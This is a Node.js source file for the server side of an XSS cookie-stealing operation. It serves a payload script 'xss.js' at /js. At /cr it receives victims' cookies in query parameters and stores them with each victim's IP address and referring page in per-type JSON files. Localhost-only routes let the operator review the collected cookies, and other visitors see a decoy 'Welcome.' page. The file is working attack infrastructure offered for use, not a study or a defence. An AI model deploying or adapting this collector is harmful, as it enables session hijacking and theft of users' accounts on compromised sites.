var http = require('http');
var fs = require('fs');
var path = require('path');
var url = require('url');
var querystring = require('querystring');
var mime = require("./mime").types;

function formatDate(date, style) {
	var y = date.getFullYear();
	var M = "0" + (date.getMonth() + 1);
	M = M.substring(M.length - 2);
	var d = "0" + date.getDate();
	d = d.substring(d.length - 2);
	var h = "0" + date.getHours();
	h = h.substring(h.length - 2);
	var m = "0" + date.getMinutes();
	m = m.substring(m.length - 2);
	var s = "0" + date.getSeconds();
	s = s.substring(s.length - 2);
	return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
}

function folderCheck(){
	var LogExist = false;
	var CookiesFolder = false;
	var files = fs.readdirSync("./");
	for (var eachfile in files)
	{
		if(files[eachfile] == "Log")
		{
			LogExist = true;
			break;
		}
		if(files[eachfile] == "Cookies")
		{
			CookiesFolder = true;
			break;
		}
	}
	if (!LogExist)
	{
		fs.mkdirSync("Log",function (err){
			if(err) throw err;
		});
	}
	if (!CookiesFolder)
	{
		fs.mkdirSync("Cookies",function (err){
			if(err) throw err;
		});
	}
}

function logIn(logContent){ //写入日志并输出控制台

	
	folderCheck();

	logContent = "\n"+logContent;
	logFileName = "Log/"+formatDate(new Date(),"yyyy-MM-dd")+"Log.txt"; //日志文件例子:2014-11-29Log.txt
	fs.appendFile(logFileName,logContent, "utf-8" , function (err){
		if (err) throw err;
	});
	console.log(logContent);
}


function CheckXSSjs(jsfile){
	if(!arguments[0]) jsfile = "xss.js";
	var JsExist = false;
	var files = fs.readdirSync("./");
	for (var eachfile in files)
	{
		if(files[eachfile] == jsfile)
		{
			JsExist = true;
			break;
		}
	}
	if (!JsExist)
	{
		console.log("用于XSS的JS文件不存在.请检查"+jsfile+"文件是否存在于根目录下.");
	}
}

function getClientIp(req) {
	return req.headers['x-forwarded-for'] ||
	req.connection.remoteAddress ||
	req.socket.remoteAddress ||
	req.connection.socket.remoteAddress;
}

function start(route,port) {
	var ErrorOccur = false;


	CheckXSSjs();


	if (isNaN(parseInt(port,10)))
	{
		console.log("请输入正确的端口号！");
		return;
	}
	var Website_port = parseInt(port,10);	//网站所在端口号。

	function onRequest(request, response) {
		var resContent = "";
		var pathname = url.parse(request.url).pathname;
		var userIP = getClientIp(request);
		if(pathname === "/favicon.ico")
		{
			fs.readFile("./favicon.png", "binary", function(err,data){
				if (!err){
					response.writeHead(200,{'Content-Type': 'image/png'});
					response.write(data,"binary");
					response.end();
				}
			});
			return;
		}
		else if(pathname === "/cr") //cr --> cookies receiver
		{
			requrl = request.url;
			args = url.parse(request.url,true).query;
			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " |Get cookie|";
			resContent += "	Source:	"+userIP;
			resContent += "	Refer:	"+requrl;
			resContent += "	ID:	"+args.id;
			resContent += "	Cookie:";
			resContent += "\n"+args.cookie+"\n";
			logIn(resContent);

			var cookieType = args.tp;
			if (!cookieType) cookieType = "unknown";
			var cookieContent = {
				"date":formatDate(new Date(),"yyyy-MM-dd hh:mm:ss"),
				"source":getClientIp(request),
				"refer":requrl,
				"cookie":args.cookie
			};
			fs.exists("Cookies/"+cookieType, function(exists){
				if (exists) {
					fs.readFile("Cookies/"+cookieType, function(err,data){
						if (err) throw err;
						data = JSON.parse(data);
						data.push(cookieContent);
						fs.writeFile("Cookies/"+cookieType, JSON.stringify(data), "utf-8", function(err){
							if (err) {
								console.log("Cookie save error."+cookieType);
								throw err;
							}
								
							else console.log("Cookie received.|"+cookieType);
						});
					});
				}
				else {
					var data = [];
					data.push(cookieContent);
					fs.writeFile("Cookies/"+cookieType, JSON.stringify(data), "utf-8", function(err){
						if (err) {
							console.log("Cookie save error."+cookieType);
							throw err;
						}
							
						else console.log("Cookie received.|"+cookieType);
					});
				}
			});
			
			response.end();
			return;
		}
		else if(pathname === "/js")
		{

			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
			resContent += "UA:	"+request.headers['user-agent']+ "	";
			var file_ =  fs.readFileSync("./xss.js", "utf-8");
			//TODO 文件读取异常处理
			response.writeHead(200, {'Content-Type': 'text/javascript'});
			response.write(file_, "utf-8");
			response.end();
			logIn(resContent);
			return;
		}
		else if (pathname === "/cr/checker")
		{
			fs.readFile("website/index.html", function(err,data) {
				if (err) throw err;
				response.writeHead(200, {'Content-Type': 'text/html'});
				response.end(data, "utf-8");
			});
		}
		else if(pathname === "/api/typelist.json")
		{
			fs.readdir("Cookies", function(err,filesName){
				if (userIP !== "127.0.0.1"){
					var lol = [];
					response.writeHead(200, {'Content-Type': 'application/json'});
					response.end(JSON.stringify(lol), "utf-8");
					console.log(userIP+" trying to use typelist API.");
				}
				if (err) throw err;
				response.writeHead(200, {'Content-Type': 'application/json'});
				response.end(JSON.stringify(filesName), "utf-8");
			});
		}
		else //全部返回固定页面
		{
			if (userIP === "127.0.0.1"){
				fs.exists("."+pathname, function (exists) {
					if (!exists) {
						response.writeHead(404, {'Content-Type': 'text/plain'});
						console.log(pathname);
						response.write("This request URL " + pathname + " was not found on this server.");
						response.end();
					} else {
						fs.readFile("."+pathname, "binary", function(err, file) {
							if (err) {
								response.writeHead(500, {'Content-Type': 'text/plain'});
								response.end(err);
							} else {
								var ext = path.extname(pathname);
								ext = ext ? ext.slice(1) : 'unknown';
								var contentType = mime[ext] || "text/plain";
								response.writeHead(200, {'Content-Type': contentType});
								response.write(file, "binary");
								response.end();
							}
						});
					}
				});
				return;
			}
			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
			resContent += "UA:	"+request.headers['user-agent']+ "	";
			logIn(resContent);
			response.writeHead(200,{'Content-Type': 'text/plain'});
			response.end("Welcome.");
			return;
		}

		


		// response.writeHead(200,{'Content-Type': 'text/plain'});
		// response.end("Hi! \n;D");

	
	}
	http.createServer(onRequest).listen(Website_port,function (err){
		logIn(formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + ' | Server started.Running at http://127.0.0.1:'+Website_port+'/');
	})

	.on('error', function(err) {
		ErrorOccur = true;
		console.log("服务器启动失败！可能是端口输入有误或端口被占用!\n"+err);
	});


}

exports.start = start;
